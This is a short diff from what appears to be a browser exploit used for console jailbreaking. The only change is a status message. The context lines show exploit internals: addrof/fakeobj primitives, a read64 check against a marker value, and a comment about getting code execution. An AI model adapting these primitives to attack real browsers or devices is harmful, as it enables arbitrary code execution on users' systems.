@@ -114,7 +114,7 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Exploit Successful !! Loading JB.. Refresh page once you get waiting for clients..");
+	debug_log("Exploit Successful !! Loading JB.. Close and Reopen the page once you get waiting for clients..");
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
